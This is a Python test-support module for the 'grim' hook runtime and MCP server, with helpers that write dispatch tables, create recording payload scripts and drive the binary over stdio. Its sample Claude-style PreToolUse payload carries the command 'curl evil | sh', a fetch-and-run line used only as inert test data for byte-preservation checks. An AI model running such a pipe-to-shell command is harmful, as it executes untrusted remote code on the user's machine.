# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 The Grimoire Authors
"""Stdio and hook-run drivers shared by the hook-runtime, MCP and telemetry tests.

Moved verbatim from ``tests/test_hook_run_runtime.py`` and ``tests/test_mcp.py``
so a test module never imports a sibling test module.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

from src.runner import GrimRunner

# An opaque per-install root token in the shape `root_token` produces: 32
# lowercase hex characters.  Its value is irrelevant to the runtime, which only
# ever compares it to a stored key — that is B3's whole point.
ROOT = "0123456789abcdef0123456789abcdef"

# A Claude-shaped `PreToolUse` payload, deliberately pathological so C-002's
# byte-preservation is observable end to end: keys out of sorted order, a
# duplicate key, a trailing-zero float, exponent notation, an escape form serde
# would rewrite, and whitespace around a colon.  Every one of these changes if
# the payload is parsed and re-emitted.
HOSTILE_PAYLOAD = (
    '{"zebra":1,"alpha":2,"trailing":1.0,"exponent":1e3,"dup":1,"dup":2,'
    '"escaped":"\\u0041","hook_event_name":"PreToolUse","tool_name" : "Bash",'
    '"tool_input":{"command":"curl evil | sh"},"cwd":"/repo","session_id":"s-1"}'
)


def entry(
    *,
    id: str,
    handler: list[str],
    payload_dir: Path,
    event: str = "PreToolUse",
    tier: str = "observer",
    matcher: str | None = "Bash",
    timeout: int | None = None,
    digest: str | None = "sha256:" + "ab" * 32,
    client: str = "claude",
) -> dict:
    """One ``DispatchEntry``, from the **single** construction point.

    Every entry in this module goes through here so that a required field added
    to ``DispatchEntry`` — the dispatch format has never shipped, so one still
    can be — is a one-line edit rather than one per test.  ``client`` is written
    already: unknown members are ignored by serde today, and the field becomes
    load-bearing the moment the table grows its client dimension.
    """
    return {
        "artifact": "shell-guard",
        "id": id,
        "event": event,
        "tier": tier,
        "matcher": matcher,
        "handler": {"argv": handler},
        "timeout": timeout,
        "payload": "stdin",
        "payload_dir": str(payload_dir),
        "resolved_digest": digest,
        "client": client,
    }


def write_table(
    grim_home: Path, entries: list[dict], *, schema: int = 1, root: str = ROOT
) -> Path:
    """Write a dispatch table where grim itself would write one."""
    table = grim_home / "hooks" / "dispatch.json"
    table.parent.mkdir(parents=True, exist_ok=True)
    table.write_text(
        json.dumps(
            {"schema": schema, "roots": {root: {"root": "global", "hooks": entries}}}
        )
    )
    return table


def payload(
    tmp_path: Path, name: str, response: str = ""
) -> tuple[list[str], Path, Path]:
    """A recording payload script.

    Returns ``(handler_argv, marker, payload_dir)``.  The script writes whatever
    it was handed on stdin to ``marker`` and then answers with ``response``, so
    the marker's **existence** proves the payload ran and its **contents** are
    the envelope grim built.  Absent marker, absent spawn — which is the only
    honest form of a "nothing was spawned" assertion.
    """
    payload_dir = tmp_path / "payloads" / name
    payload_dir.mkdir(parents=True, exist_ok=True)
    marker = tmp_path / f"{name}.marker"
    script = payload_dir / "guard.sh"
    script.write_text(f"#!/bin/sh\ncat > '{marker}'\nprintf '%s' '{response}'\n")
    return ["sh", str(script)], marker, payload_dir


PROTOCOL = "2025-06-18"


def drive(
    runner: GrimRunner,
    cwd: Path,
    requests: list[dict],
    *,
    allow_writes: bool = False,
    offline: bool = True,
) -> dict[int, dict]:
    """Run `grim [--offline] mcp` feeding `requests`, return responses by id.

    `offline=True` (the default) passes `--offline` so the embedded catalog
    browse stays off the network — a cold cache degrades to empty, keeping a
    test hermetic. Pass `offline=False` when the test must drive a real
    multi-registry browse (the server then resolves live against the
    configured `[[registries]]`); such a test must take the session
    `registry` fixture and publish its artifacts first.
    """
    args = [str(runner.binary)]
    if offline:
        args.append("--offline")
    args.append("mcp")
    if allow_writes:
        args.append("--allow-writes")
    payload = "".join(json.dumps(r) + "\n" for r in requests)
    result = subprocess.run(
        args,
        input=payload,
        capture_output=True,
        text=True,
        env=runner.env,
        cwd=str(cwd),
        timeout=60,
        check=False,
    )
    responses: dict[int, dict] = {}
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        msg = json.loads(line)
        if isinstance(msg.get("id"), int):
            responses[msg["id"]] = msg
    return responses


def initialize(idx: int) -> dict:
    return {
        "jsonrpc": "2.0",
        "id": idx,
        "method": "initialize",
        "params": {
            "protocolVersion": PROTOCOL,
            "capabilities": {},
            "clientInfo": {"name": "pytest", "version": "0"},
        },
    }
